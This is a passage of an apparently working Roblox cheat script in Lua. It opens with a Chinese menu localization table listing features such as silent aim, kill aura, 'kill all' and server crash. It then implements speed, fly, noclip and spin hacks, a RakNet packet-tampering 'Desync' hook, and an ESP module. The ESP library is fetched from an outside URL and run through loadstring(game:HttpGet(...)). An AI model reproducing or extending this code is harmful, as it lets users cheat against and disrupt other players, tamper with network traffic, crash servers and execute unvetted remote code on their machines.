							["nnp-op-gun-mod-btn"] = "应用",
							["No Dash CD"] = "冲刺无冷却",
							["No Hitstun"] = "无僵直",
							["No Jump Fatigue"] = "无跳跃疲劳",
							["No Slow"] = "无减速",
							["No Smoke"] = "无烟雾",
							["no-in-combat"] = "无战斗状态",
							["no-sit"] = "禁止坐下",
							["ohio-aim-assist"] = "辅助瞄准",
							["ohio-aim-assist-animation"] = "动画",
							["ohio-aim-assist-fov"] = "视野",
							["ohio-aim-assist-part"] = "部位",
							["ohio-aim-assist-prediction-x"] = "预判 X",
							["ohio-aim-assist-prediction-y"] = "预判 Y",
							["ohio-aim-assist-range"] = "范围",
							["ohio-aim-assist-x-speed"] = "水平速度",
							["ohio-aim-assist-y-speed"] = "垂直速度",
							["ohio-aim-assist-use-fov"] = "使用范围",
							["ohio-aim-assist-fov-color"] = "颜色",
							["ohio-silent-aim"] = "静默自瞄",
							["ohio-silent-aim-fov"] = "最大视野",
							["ohio-silent-aim-hit-chance"] = "命中率",
							["ohio-silent-aim-accuracy"] = "精度",
							["ohio-silent-aim-point-scale"] = "点位缩放",
							["ohio-silent-aim-priority"] = "命中优先级",
							["ohio-silent-aim-hitbox-head"] = "头部",
							["ohio-silent-aim-hitbox-body"] = "身体",
							["ohio-silent-aim-hitbox-arms"] = "手臂",
							["ohio-silent-aim-hitbox-legs"] = "腿部",
							["ohio-silent-aim-bullet-drop"] = "补偿下坠",
							["ohio-silent-aim-prediction"] = "补偿移动",
							["ohio-silent-aim-prediction-x"] = "预判 X",
							["ohio-silent-aim-prediction-y"] = "预判 Y",
							["ohio-silent-aim-visualize-fov"] = "显示视野",
							["ohio-silent-aim-ignore-downed"] = "忽略倒地",
							["ohio-auto-counter"] = "自动反击",
							["ohio-auto-counter-keybind"] = "按键",
							["ohio-auto-counter-on-attack"] = "受击时",
							["ohio-auto-heal"] = "自动治疗",
							["ohio-auto-heal-keybind"] = "按键",
							["ohio-auto-kill-all"] = "自动杀全服",
							["ohio-auto-kill-all-keybind"] = "按键",
							["ohio-auto-kill-blacklist"] = "自动杀黑名单",
							["ohio-auto-kill-blacklist-hide-interval-ms"] = "隐藏间隔(毫秒)",
							["ohio-auto-kill-blacklist-keybind"] = "按键",
							["ohio-auto-vest"] = "自动防弹衣",
							["ohio-auto-vest-keybind"] = "按键",
							["ohio-auto-vest-vest"] = "防弹衣",
							["ohio-farm-admin-check"] = "管理员检测",
							["ohio-farm-aura"] = "农场光环",
							["ohio-farm-auto-disassemble"] = "自动拆解",
							["ohio-farm-auto-dumbell"] = "自动哑铃",
							["ohio-farm-auto-farm"] = "自动农场",
							["ohio-farm-auto-leave"] = "自动离开",
							["ohio-farm-auto-mask"] = "自动面具",
							["ohio-farm-auto-remove"] = "自动移除",
							["ohio-farm-auto-rewards"] = "自动奖励",
							["ohio-farm-auto-sell"] = "自动出售",
							["ohio-farm-auto-use"] = "自动使用",
							["ohio-farm-mask"] = "面具",
							["ohio-farm-max-sell"] = "最大出售",
							["ohio-farm-min-cash"] = "最低农场现金",
							["ohio-farm-min-price"] = "最低农场价格",
							["ohio-farm"] = "Ohio 农场",
							["ohio-farm-min-stash-price"] = "最低仓库价格",
							["ohio-farm-stash-gem"] = "刷仓库宝石",
							["ohio-farm-use-ignore"] = "使用忽略",
							["ohio-flame-acid-kill-nearest-keybind"] = "按键",
							["ohio-flame-acid-nearest"] = "火焰/酸液最近",
							["ohio-grab-aura"] = "抓取光环",
							["ohio-grab-aura-drop"] = "丢弃",
							["ohio-grab-aura-keybind"] = "按键",
							["ohio-gun-mod"] = "枪械修改",
							["ohio-gun-mod-bullet-lifetime"] = "子弹存活时间",
							["ohio-gun-mod-bullet-speed"] = "子弹速度",
							["ohio-gun-mod-fire-debounce"] = "开火延迟",
							["ohio-gun-mod-recoil"] = "后坐力",
							["ohio-gun-mod-spread"] = "扩散",
							["ohio-handcuff-aura"] = "手铐光环",
							["ohio-handcuff-aura-keybind"] = "按键",
							["ohio-hitbox"] = "命中框",
							["ohio-hitbox-color"] = "颜色",
							["ohio-hitbox-keybind"] = "按键",
							["ohio-hitbox-part"] = "部位",
							["ohio-hitbox-hit-chance"] = "命中率",
							["ohio-hitbox-size"] = "大小",
							["ohio-hitbox-transparency"] = "透明度",
							["ohio-iff-keybind"] = "按键",
							["ohio-ignore-force-field"] = "忽略无敌",
							["ohio-kill-method"] = "方式",
							["ohio-legit"] = "合法化",
							["ohio-legit-state"] = "状态",
							["ohio-legit-inf-coffee"] = "无限咖啡",
							["ohio-melee-aura"] = "近战光环",
							["ohio-melee-aura-break-vest"] = "破甲",
							["ohio-melee-aura-vehicles"] = "载具",
							["ohio-misc"] = "Ohio 杂项",
							["ohio-misc-anti-sticky-lag"] = "防粘滞卡顿",
							["ohio-misc-beautify-balloon-balloon"] = "气球 → 气球",
							["ohio-misc-beautify-balloon-bat_balloon"] = "气球 → 蝙蝠气球",
							["ohio-misc-beautify-balloon-black_rose"] = "气球 → 黑玫瑰",
							["ohio-misc-beautify-balloon-bunny_balloon"] = "气球 → 兔子气球",
							["ohio-misc-beautify-balloon-clover_balloon"] = "气球 → 四叶草气球",
							["ohio-misc-beautify-balloon-dollar_balloon"] = "气球 → 美金气球",
							["ohio-misc-beautify-balloon-ghost_balloon"] = "气球 → 幽灵气球",
							["ohio-misc-beautify-balloon-gold_clover_balloon"] = "气球 → 金四叶草气球",
							["ohio-misc-beautify-balloon-golden_rose"] = "气球 → 金玫瑰",
							["ohio-misc-beautify-balloon-heart_balloon"] = "气球 → 爱心气球",
							["ohio-misc-beautify-balloon-kunai"] = "气球 → 苦无",
							["ohio-misc-beautify-balloon-rainbow_umbrella"] = "气球 → 彩虹雨伞",
							["ohio-misc-beautify-balloon-skull_balloon"] = "气球 → 骷髅气球",
							["ohio-misc-beautify-balloon-snowflake_balloon"] = "气球 → 雪花气球",
							["ohio-misc-beautify-balloon-spirit_kunai"] = "气球 → 灵魂苦无",
							["ohio-misc-beautify-balloon-umbrella"] = "气球 → 雨伞",
							["ohio-misc-beautify-candy-blue"] = "糖果棒 → 蓝糖果棒",
							["ohio-misc-beautify-items"] = "美化物品",
							["ohio-misc-beautify-kunai-spirit"] = "苦无 → 灵魂苦无",
							["ohio-misc-beautify-scythe-spectral"] = "镰刀 → 幽灵镰刀",
							["ohio-misc-block-vfx"] = "屏蔽特效",
							["ohio-misc-buy-gun"] = "购买枪支",
							["ohio-misc-fake-balloon"] = "假气球",
							["ohio-misc-fake-cash"] = "假现金",
							["ohio-misc-fake-cash-input"] = "数量",
							["ohio-misc-fake-wallet"] = "假钱包",
							["ohio-misc-get-balloon"] = "获取气球",
							["ohio-misc-get-gun"] = "获取枪支",
							["ohio-misc-get-kunai"] = "获取苦无",
							["ohio-misc-join-player"] = "加入玩家",
							["ohio-misc-join-plr-btn"] = "加入",
							["ohio-misc-join-plr-input"] = "玩家名称/ID",
							["ohio-misc-join-server"] = "加入服务器",
							["ohio-misc-join-vc-server"] = "语音服",
							["ohio-misc-no-camera-shake"] = "无镜头抖动",
							["ohio-misc-spawn-cash"] = "生成现金",
							["ohio-misc-spawn-cash-btn"] = "生成",
							["ohio-misc-spawn-cash-input"] = "数量",
							["ohio-misc-unlock-skin"] = "解锁皮肤",
							["ohio-rage"] = "Ohio 愤怒",
							["ohio-ragebot"] = "愤怒机器人",
							["ohio-ragebot-keybind"] = "按键",
							["ohio-ragebot-nextbot"] = "Nextbot",
							["ohio-rpg-trident-all"] = "RPG/三叉戟全服",
							["ohio-rpg-trident-all-delay"] = "延迟",
							["ohio-rpg-trident-all-keybind"] = "按键",
							["ohio-shake-aura"] = "抖动光环",
							["ohio-shake-aura-keybind"] = "按键",
							["ohio-shake-aura-max-target"] = "最大目标",
							["ohio-spray-nearest"] = "喷射最近",
							["ohio-spray-nearest-keybind"] = "按键",
							["ohio-stomp-aura"] = "踩踏光环",
							["ohio-stomp-aura-keybind"] = "按键",
							["ohio-target"] = "目标",
							["ohio-target-kill-method"] = "击杀方式",
							["One Punch"] = "一拳超人",
							["Prevent Respawn"] = "阻止重生光环",
							["render-bullet-tracer"] = "子弹轨迹",
							["render-camera"] = "相机",
							["render-camera-fov"] = "视野",
							["render-camera-noclip"] = "穿墙",
							["render-camera-smooth"] = "平滑",
							["render-camera-smooth-value"] = "速度",
							["render-esp"] = "ESP",
							["render-hitlog"] = "命中记录",
							["render-world"] = "世界",
							["RenderState.BulletTracer.EnemyColor"] = "敌人颜色",
							["RenderState.BulletTracer.SelfColor"] = "自身颜色",
							["RenderState.BulletTracer.Time"] = "时间",
							["RenderState.BulletTracer.Tracer"] = "模式",
							["RenderState.World.Color"] = "颜色",
							["Scythe → Spectral Scythe"] = "镰刀 → 幽灵镰刀",
							["settings-hit-sound"] = "命中音效",
							["settings-menu"] = "菜单",
							["settings-resolve-cache"] = "解析缓存",
							["Settings.ManualLoad.Module"] = "手动加载",
							["SettingsState.HitSound.Sound"] = "音效",
							["Silent Block"] = "静默防御",
							["silent-block"] = "静默防御",
							["Size X"] = "大小X",
							["Size Y"] = "大小Y",
							["Size Z"] = "大小Z",
							["TP All"] = "传送全服",
							["UBG Misc"] = "UBG 杂项",
							["UBG Rage"] = "UBG 暴力",
							["UBG Settings"] = "UBG 设置",
							["ubg-misc"] = "UBG 杂项",
							["ubg-rage"] = "UBG 暴力",
							["ubg-settings"] = "UBG 设置",
							UBG_ability_aura = "技能光环",
							UBG_ability_aura_mode = "模式",
							UBG_anti_grab = "反抓取",
							UBG_carry_abuse = "携带滥用",
							UBG_combat_switch = "允许战斗换角色",
							UBG_damage_boost = "伤害加强",
							UBG_dash_patch = "冲刺修补",
							UBG_endless_ult = "延长大招",
							UBG_fake_lag = "虚假延迟",
							UBG_fake_lag_interval = "虚假延迟间隔",
							UBG_fast_attack = "快速攻击",
							UBG_godmode = "无敌",
							UBG_hide_server_output = "屏蔽输出（服务器）",
							UBG_hide_sound = "屏蔽音效",
							UBG_hide_vfx = "屏蔽特效",
							UBG_hitbox = "范围",
							UBG_instant_respawn = "秒复活",
							UBG_instant_ult = "大招秒变",
							UBG_kill_aura = "杀戮光环",
							UBG_legit = "合法化",
							UBG_multi_ult = "大招多用",
							UBG_no_dash_cd = "冲刺无冷却",
							UBG_no_hitstun = "无僵直",
							UBG_no_jumpfatigue = "无跳跃疲劳",
							UBG_no_slow = "无减速",
							UBG_one_punch = "一拳超人",
							UBG_prevent_respawn = "阻止重生光环",
							UBG_silent_block = "静默防御",
							UBG_size_x = "大小X",
							UBG_size_y = "大小Y",
							UBG_size_z = "大小Z",
							UBG_tp_all = "传送全服",
							UBG_visualize = "可视化",
							UBG_wall_abuse = "墙打滥用",
							UBG_wall_abuse_death = "死亡",
							UBG_wall_abuse_delay = "延迟",
							UBG_wall_crash = "墙打炸服",
							UBG_wall_crash_delay = "延迟",
							Visualize = "可视化",
							["X Speed"] = "水平速度",
							["Y Speed"] = "垂直速度",
							["w-auto-equip-item"] = "物品",
							["w-auto-equip-keybind"] = "按键",
							["w-finish-arrest-keybind"] = "按键",
							["w-hitbox-keybind"] = "按键",
							["w-hitbox-part"] = "部位",
							["w-hitbox-size"] = "大小",
							["w-ignore-crawling"] = "忽略爬行",
							["w-ignore-grabbed"] = "忽略抓取",
							["w-ignore-knocked"] = "忽略击倒",
							["w-ragebot-keybind"] = "按键",
							["w-refresh-items"] = "刷新物品",
							["w-save-aura-keybind"] = "按键",
							["w-wallbang"] = "穿墙射击",
							["Wall Abuse"] = "墙打滥用",
							["Wall Crash"] = "墙打炸服",
							wallbang = "穿墙射击",
							["wanted-aim-assist"] = "辅助瞄准",
							["wanted-aim-assist-animation"] = "动画",
							["wanted-aim-assist-fov"] = "视野",
							["wanted-aim-assist-fov-color"] = "颜色",
							["wanted-aim-assist-part"] = "部位",
							["wanted-aim-assist-prediction-x"] = "预判 X",
							["wanted-aim-assist-prediction-y"] = "预判 Y",
							["wanted-aim-assist-range"] = "范围",
							["wanted-aim-assist-use-fov"] = "使用范围",
							["wanted-aim-assist-x-speed"] = "水平速度",
							["wanted-aim-assist-y-speed"] = "垂直速度",
							["wanted-auto-equip"] = "自动装备",
							["wanted-auto-farm"] = "自动农场",
							["wanted-car-mod"] = "车辆改装",
							["wanted-car-mod-topspeed"] = "最高速度",
							["wanted-car-mod-reversespeed"] = "倒车极速",
							["wanted-car-mod-gasaccel"] = "油门加速",
							["wanted-car-mod-brakeforce"] = "刹车力度",
							["wanted-car-mod-handbrake"] = "手刹强度",
							["wanted-car-mod-gearboost"] = "换挡推力",
							["wanted-car-mod-finaldrive"] = "终传动比",
							["wanted-car-mod-maxrpm"] = "最大转速",
							["wanted-car-mod-shiftratio"] = "升挡转速比",
							["wanted-car-mod-shifttime"] = "换挡耗时",
							["wanted-car-mod-turboboost"] = "涡轮增压倍率",
							["wanted-car-mod-turbolag"] = "涡轮延迟",
							["wanted-car-mod-drag"] = "空气阻力",
							["wanted-car-mod-downforce"] = "下压力",
							["wanted-car-mod-steermax"] = "最大转向角",
							["wanted-car-mod-steermin"] = "最小转向角",
							["wanted-car-mod-steerspeed"] = "转向速度",
							["wanted-car-mod-steermodifier"] = "转向灵敏度",
							["wanted-car-mod-steerhandbrake"] = "手刹转向倍率",
							["wanted-car-mod-susstiffness"] = "悬挂刚度",
							["wanted-car-mod-susdamping"] = "悬挂阻尼",
							["wanted-car-mod-ridefront"] = "前车身高度",
							["wanted-car-mod-riderear"] = "后车身高度",
							["wanted-car-mod-antiroll"] = "防侧倾杆",
							["wanted-car-mod-camber"] = "外倾角",
							["wanted-car-mod-weightfriction"] = "摩擦权重",
							["wanted-car-mod-weightaxle"] = "轴重权重",
							["wanted-car-mod-weightchassis"] = "车架权重",
							["wanted-car-mod-weightengine"] = "引擎权重",
							["wanted-car-mod-maxhealthchassis"] = "车架耐久上限",
							["wanted-car-mod-maxhealthtire"] = "轮胎耐久上限",
							["wanted-car-mod-maxhealthwindow"] = "车窗耐久上限",
							["wanted-car-mod-armorchassis"] = "车架护甲",
							["wanted-car-mod-armortire"] = "轮胎护甲",
							["wanted-car-mod-armorwindow"] = "车窗护甲",
							["wanted-car-mod-leanangle"] = "压弯角",
							["wanted-car-mod-wheelieangle"] = "抬头角",
							["wanted-car-mod-frontangle"] = "前倾角",
							["wanted-car-mod-slopetorque"] = "坡道扭矩倍率",
							["wanted-farm"] = "Wanted 农场",
							["wanted-farm-aura"] = "农场光环",
							["wanted-finish-arrest-aura"] = "处决/逮捕光环",
							["wanted-gun-mod"] = "枪械修改",
							["wanted-gun-mod-bullet-lifetime"] = "子弹存活时间",
							["wanted-gun-mod-bullet-speed"] = "子弹速度",
							["wanted-gun-mod-recoil"] = "后坐力",
							["wanted-gun-mod-spread"] = "扩散",
							["wanted-hitbox"] = "命中框",
							["wanted-legit"] = "合法化",
							["wanted-misc"] = "Wanted 杂项",
							["wanted-no-bank-gas"] = "无银行毒气",
							["wanted-no-bank-trip-laser"] = "无银行绊线",
							["wanted-no-ragdoll"] = "无布娃娃",
							["wanted-no-vehicle-hits"] = "无载具撞击",
							["wanted-rage"] = "Wanted 愤怒",
							["wanted-ragebot"] = "愤怒机器人",
							["wanted-save-aura"] = "救援光环",
							["wanted-silent-aim"] = "静默自瞄",
							["wanted-silent-aim-accuracy"] = "精度",
							["wanted-silent-aim-fov"] = "最大视野",
							["wanted-silent-aim-hit-chance"] = "命中率",
							["wanted-silent-aim-hitbox-arms"] = "手臂",
							["wanted-silent-aim-hitbox-body"] = "身体",
							["wanted-silent-aim-hitbox-head"] = "头部",
							["wanted-silent-aim-hitbox-legs"] = "腿部",
							["wanted-silent-aim-ignore-downed"] = "忽略倒地",
							["wanted-silent-aim-point-scale"] = "点位缩放",
							["wanted-silent-aim-prediction-x"] = "预判 X",
							["wanted-silent-aim-prediction-y"] = "预判 Y",
							["wanted-silent-aim-priority"] = "命中优先级",
							["wanted-silent-aim-visualize-fov"] = "显示视野",
							ohio_farm_aura_jewelrycase = "珠宝柜",
							farm_task_jewelrycase = "珠宝柜",
						},
					})

					local function fn7(H,m,h) v14 :Notify({Title=H,Content=m,Duration=h or 3});end
					local v15 = v14:CreateTab({ Id = "tab-movement", Name = "Movement" })

					MovementState = {
						Speed = { Module = nil, Value = 40, Connect = nil },
						HighJump = { Module = nil, Value = 80, Connect = nil },
						Fly = { Module = nil, Value = 50, Connect = nil },
						Noclip = { Module = nil, Connect = nil },
						Spin = { Module = nil, Value = 40, Mode = "Normal", Connect = nil },
						Desync = { Module = nil, Mode = "Static", Value = 30 },
					}

					local v16 = nil
					local n = 0
					local n2 = 1

					local function fn8()
						local character = LocalPlayer.Character
						if not character then
							return nil, nil
						end
						local v17 = FindFirstChildOfClass(character, "Humanoid")
						local v18 = FindFirstChild(character, "HumanoidRootPart")
						if not v17 or not v18 or v17.Health <= 0 then
							return nil, nil
						end
						return v17, v18
					end

					local function fn9()
						if MovementState.Speed.Connect then
							Disconnect(MovementState.Speed.Connect)
							MovementState.Speed.Connect = nil
						end
					end

					local function fn10()
						fn9()

						MovementState.Speed.Connect = Connect(RunService.PreSimulation, function()
							if not MovementState.Speed.Module:Get() or MovementState.Fly.Module:Get() then
								return
							end
							local v17, v18 = fn8()
							if not v17 or not v18 then
								return
							end
							local climbing = Enum.HumanoidStateType.Climbing
							if v17:GetState() == climbing then
								v18.AssemblyLinearVelocity = NewVector3(0, 1 * MovementState.Speed.Value, 0)
								return
							end
							v18.AssemblyLinearVelocity = v17.MoveDirection * MovementState.Speed.Value + NewVector3(0, v18.AssemblyLinearVelocity.Y, 0)
						end)
					end

					local function fn11()
						if v16 then
							return v16
						end
						local v17 = FindFirstChild(PlayerScripts, "PlayerModule")
						local v18 = v17 and FindFirstChild(v17, "ControlModule")
						if not v18 then
							return nil
						end
						local ok4, result4 = pcall(require, v18)
						if ok4 then
							v16 = result4
							return v16
						end
						return nil
					end

					local function fn12()
						local v17 = Camera()
						local v18 = fn11()
						if not v17 or not v18 then
							return EmptyVector3
						end
						local moveVector = v18:GetMoveVector()
						if moveVector.Magnitude <= 0.2 then
							return EmptyVector3
						end
						local cFrame = v17.CFrame
						return cFrame.RightVector * moveVector.X - cFrame.LookVector * moveVector.Z
					end

					stopFly = function()
						if MovementState.Fly.Connect then
							Disconnect(MovementState.Fly.Connect)
							MovementState.Fly.Connect = nil
						end
					end

					startFly = function()
						stopFly()

						MovementState.Fly.Connect = Connect(RunService.PreSimulation, function()
							if not MovementState.Fly.Module:Get() then
								return
							end
							local v17, v18 = fn8()
							if not v17 or not v18 or not (v18 and v18.Parent) then
								return
							end
							local v19 = fn12()
							if v19.Magnitude < 0.01 then
								v18.AssemblyLinearVelocity = EmptyVector3
								return
							end
							v18.AssemblyLinearVelocity = v19.Unit * MovementState.Fly.Value + NewVector3(0, 1.5, 0)
						end)
					end

					local function fn13()
						if MovementState.Noclip.Connect then
							Disconnect(MovementState.Noclip.Connect)
							MovementState.Noclip.Connect = nil
						end
					end

					local function fn14()
						fn13()

						MovementState.Noclip.Connect = Connect(RunService.PreSimulation, function()
							if not MovementState.Noclip.Module:Get() then
								return
							end
							local character = LocalPlayer.Character
							if not character then
								return
							end
							local v17 = FindFirstChildOfClass(character, "Humanoid")
							if not v17 then
								return
							end
							local physics = Enum.HumanoidStateType.Physics

							if v17:GetState() == physics then
								for _, v18 in GetChildren(character) do
									if IsA(v18, "BasePart") then
										v18.CanCollide = true
									end
								end

								return
							end

							for _, v18 in GetChildren(character) do
								if IsA(v18, "BasePart") then
									v18.CanCollide = false
								end
							end
						end)
					end

					local function fn15()
						if MovementState.Spin.Connect then
							Disconnect(MovementState.Spin.Connect)
							MovementState.Spin.Connect = nil
						end

						local v17 = fn8()
						if not v17 then
							return
						end
						v17.AutoRotate = true
					end

					local function fn16()
						n = 0
						n2 = 1
					end

					local function fn17()
						local v17 = Camera()
						if not v17 then
							return nil
						end
						local n3 = v17.CFrame.LookVector * NewVector3(1, 0, 1)
						if n3.Magnitude < 0.01 then
							return nil
						end
						local unit = n3.Unit
						return Atan2(unit.X, unit.Z)
					end

					local function fn18()
						fn15()
						fn16()

						MovementState.Spin.Connect = Connect(RunService.PreSimulation, function(arg)
							if not MovementState.Spin.Module:Get() then
								return
							end
							local v17, v18 = fn8()
							if not v17 or not v18 then
								return
							end
							v17.AutoRotate = false
							local v19, v20, v21 = v18.CFrame:ToOrientation()

							if MovementState.Spin.Mode == "Sway" then
								local v22 = fn17()
								if not v22 then
									return
								end
								n += Rad(20 * MovementState.Spin.Value) * n2 * arg

								if Abs(n) >= 6.5973445725385655 then
									n = 0
									n2 = -n2
								end

								v18.CFrame = NewCFrame(v18.Position) * Angles(v19, v22 + n, v21)
							else
								local n3 = 20 * MovementState.Spin.Value
								local v22 = Rad(tick() * n3 % 360)
								v18.CFrame = NewCFrame(v18.Position) * Angles(v19, v22, v21)
							end
						end)
					end

					MovementState.Speed.Module = v15:CreateModule({
						Id = "movement-speed",
						Name = "Speed",
						Callback = function(arg)
							if arg then
								fn10()
							else
								fn9()
							end
						end,
					})

					MovementState.Speed.Module:CreateKeybind({
						Id = "movement_speed_keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Speed.Module:Set(not MovementState.Speed.Module:Get())
						end,
					})

					MovementState.Speed.Module:CreateSlider({
						Id = "movement_speed_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.Speed.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Speed.Value = value
						end,
					})

					MovementState.HighJump.Module = v15:CreateModule({
						Id = "movement-high-jump",
						Name = "High Jump",
						Callback = function(arg)
							if MovementState.HighJump.Connect then
								Disconnect(MovementState.HighJump.Connect)
								MovementState.HighJump.Connect = nil
							end

							if arg then
								local flag = true

								MovementState.HighJump.Connect = Connect(UserInputService.JumpRequest, function()
									local v17, v18 = fn8()
									if not v17 or not v18 or v17.FloorMaterial == Enum.Material.Air or not flag then
										return
									end
									flag = false
									local assemblyLinearVelocity = v18.AssemblyLinearVelocity
									v18.AssemblyLinearVelocity = NewVector3(assemblyLinearVelocity.X, MovementState.HighJump.Value, assemblyLinearVelocity.Z)

									Connect(v17.StateChanged, function(arg2, arg3)
										if arg3 == Enum.HumanoidStateType.Landed then
											flag = true
										end
									end)
								end)
							end
						end,
					})

					MovementState.HighJump.Module:CreateKeybind({
						Id = "movement_highjump_keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.HighJump.Module:Set(not MovementState.HighJump.Module:Get())
						end,
					})

					MovementState.HighJump.Module:CreateSlider({
						Id = "movement_highjump_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.HighJump.Value,
						Step = 1,
						Callback = function(value)
							MovementState.HighJump.Value = value
						end,
					})

					MovementState.Fly.Module = v15:CreateModule({
						Id = "movement-fly",
						Name = "Fly",
						Callback = function(arg)
							if arg then
								startFly()
							else
								stopFly()
							end
						end,
					})

					MovementState.Fly.Module:CreateKeybind({
						Id = "MovementState.FlyKeybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Fly.Module:Set(not MovementState.Fly.Module:Get())
						end,
					})

					MovementState.Fly.Module:CreateSlider({
						Id = "movement_fly_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.Fly.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Fly.Value = value
						end,
					})

					MovementState.Noclip.Module = v15:CreateModule({
						Id = "movement-noclip",
						Name = "Noclip",
						Callback = function(arg)
							if arg then
								fn14()
							else
								fn13()
							end
						end,
					})

					MovementState.Noclip.Module:CreateKeybind({
						Id = "MovementState.NoclipKeybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Noclip.Module:Set(not MovementState.Noclip.Module:Get())
						end,
					})

					MovementState.Spin.Module = v15:CreateModule({
						Id = "movement-spin",
						Name = "Spin",
						Callback = function(arg)
							if arg then
								fn18()
							else
								fn15()
							end
						end,
					})

					MovementState.Spin.Module:CreateKeybind({
						Id = "movement_spin_keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Spin.Module:Set(not MovementState.Spin.Module:Get())
						end,
					})

					MovementState.Spin.Module:CreateSlider({
						Id = "movement_spin_value",
						Name = "Value",
						Min = 0,
						Max = 1000,
						Default = MovementState.Spin.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Spin.Value = value
						end,
					})

					MovementState.Spin.Module:CreateSelector({
						Id = "movement_spin_mode",
						Name = "Mode",
						Options = { { Value = "Normal" }, { Value = "Sway" } },
						Default = "Normal",
						Callback = function(mode)
							MovementState.Spin.Mode = mode
						end,
					})

					local n3 = 0

					local function fn19(arg)
						if arg.PacketId == 27 then
							local asBuffer = arg.AsBuffer
							buffer.readu32(asBuffer, 1)

							if MovementState.Desync.Mode == "Static" then
								buffer.writeu32(asBuffer, 1, 4294967295)
							else
								n3 += 1

								if n3 % MovementState.Desync.Value == 0 then
									buffer.writeu32(asBuffer, 1, 0)
								else
									buffer.writeu32(asBuffer, 1, 4294967295)
								end
							end

							arg:SetData(asBuffer)
						end
					end

					MovementState.Desync.Module = v15:CreateModule({
						Id = "movement-desync",
						Name = "Desync",
						Callback = function(arg)
							if raknet and typeof(raknet) == "table" and raknet.add_send_hook and raknet.remove_send_hook then
								if arg then
									raknet.add_send_hook(fn19)
								else
									raknet.remove_send_hook(fn19)
								end
							else
								fn7("Desync Failed", "Executor does not support RakNet", 10)
							end
						end,
					})

					MovementState.Desync.Module:CreateKeybind({
						Id = "movement-desync-keybind",
						Name = "Keybind",
						Callback = function()
							MovementState.Desync.Module:Set(not MovementState.Desync.Module:Get())
						end,
					})

					MovementState.Desync.Module:CreateSelector({
						Id = "movement-desync-mode",
						Name = "Mode",
						Options = { { Value = "Static" }, { Value = "Dynamic" } },
						Default = MovementState.Desync.Mode,
						Callback = function(mode)
							MovementState.Desync.Mode = mode
						end,
					})

					MovementState.Desync.Module:CreateSlider({
						Id = "movement_desync_value",
						Name = "Dynamic Packet",
						Min = 1,
						Max = 64,
						Default = MovementState.Desync.Value,
						Step = 1,
						Callback = function(value)
							MovementState.Desync.Value = value
						end,
					})

					local v17 = v14:CreateTab({ Id = "tab-render", Name = "Render" })
					local v18 = _G

					if typeof(getgenv) == "function" then
						local ok4, result4 = pcall(getgenv)

						if ok4 and typeof(result4) == "table" then
							v18 = result4
						end
					end

					local lib2 = loadstring(game:HttpGet(typeof(v18.MoonEspLibraryUrl) == "string" and v18.MoonEspLibraryUrl ~= "" and v18.MoonEspLibraryUrl or "https://cnb.cool/MoonLua/ESP/-/git/raw/main/1"))()
					local config = lib2.Config
					config.Enabled = false
					config.MaxDistance = 5000
					config.Name = true
					config.Health = false
					config.Distance = false
					config.Tool = false
					config.HealthBar = false
					config.Flags = false
					config.Boxes = false
					config.Chams = true
					config.OnlyEnemy = true
					config.WhitelistColor = NewRGB(72, 221, 146)
					config.BlacklistColor = NewRGB(255, 94, 124)
					config.TextColor = NewRGB(255, 255, 255)
					config.TextOutboxColor = NewRGB(0, 0, 0)
					config.BoxColor = NewRGB(0, 255, 0)
					config.HealthBackColor = NewRGB(0, 0, 0)
					config.HealthHighColor = NewRGB(0, 255, 0)
					config.HealthLowColor = NewRGB(255, 0, 0)
					config.ForceFieldFlagColor = NewRGB(110, 190, 255)
					config.ChamsOutline = true
					config.ChamsInline = true
					config.ChamsOutlineColor = NewRGB(255, 255, 255)
					config.ChamsOutlineAlpha = 0.3
					config.ChamsInlineColor = NewRGB(128, 128, 255)
					config.ChamsInlineAlpha = 0.8
					config.ChamsOutlineSize = 0.15
					config.ChamsInlineSize = 0.1
					config.HealthBarWidth = 4
					config.TextSize = 13
					config.MinTextSize = 9
					config.TextShrinkStartDistance = 300
					config.TextShrinkEndDistance = 1200
					config.TextYOffset = 5

					lib2:Override({
						GetPriority = function(arg)
							if typeof(PlayerList) == "table" and typeof(PlayerList.GetState) == "function" then
								local ok4, result4 = pcall(PlayerList.GetState, PlayerList, arg)

								if ok4 then
									if result4 == "Whitelist" then
										return "Friendly"
									end

									if result4 == "Blacklist" then
										return "Enemy"
									end
								end
							end

							return "Neutral"
						end,
						GetGuiParent = function()
							local v19 = FindFirstChildOfClass(LocalPlayer, "PlayerGui")
							if v19 then
								return v19
							end
							return LocalPlayer:WaitForChild("PlayerGui")
						end,
					})

					if v18.RobloxESP and v18.RobloxESP.Destroy then
						v18.RobloxESP:Destroy()
					end

					v18.RobloxESP = lib2

					local tbl4 = {
						ESP = nil,
						Camera = {
							Module = nil,
							Fov = 120,
							Noclip = true,
							OriginalFov = nil,
							OriginalOcclusionMode = nil,
							FovConnection = nil,
							OcclusionConnection = nil,
							SmoothPosition = EmptyVector3,
							Smooth = { Enabled = false, Speed = 15 },
						},
						World = {
							Module = nil,
							Color = NewRGB(190, 220, 255),
							Brightness = 0.15,
							Contrast = 0.135,
							Saturation = -0.225,
							Instance = nil,
						},
						BulletTracer = {
							Module = nil,
							SelfColor = NewRGB(37, 173, 255),
							EnemyColor = NewRGB(255, 94, 124),
							Time = 4,
							Tracer = "Obelus",
							Tracers = {},
							Tracerlist = {
								Obelus = {
									Texture = "rbxassetid://2382169232",
									Brightness = 1.5,
									Transparency = NumberSequence.new(0.7),
									LightEmission = 1,
									LightInfluence = 0,
									Segments = 1,
									TextureLength = 5,
									TextureMode = Enum.TextureMode.Stretch,
									TextureSpeed = 0,
									Width0 = 0.2,
									Width1 = 0.2,
									FaceCamera = true,
								},
								Lightning = {
									Texture = "rbxassetid://7151778302",
									Brightness = 1.5,
									Transparency = NumberSequence.new(0.7),
									LightEmission = 1,
									LightInfluence = 0,
									Segments = 10,
									TextureLength = 1,
									TextureMode = Enum.TextureMode.Stretch,
									TextureSpeed = 1,
									Width0 = 1.2,
									Width1 = 1.2,
									FaceCamera = true,
								},
								DNA = {
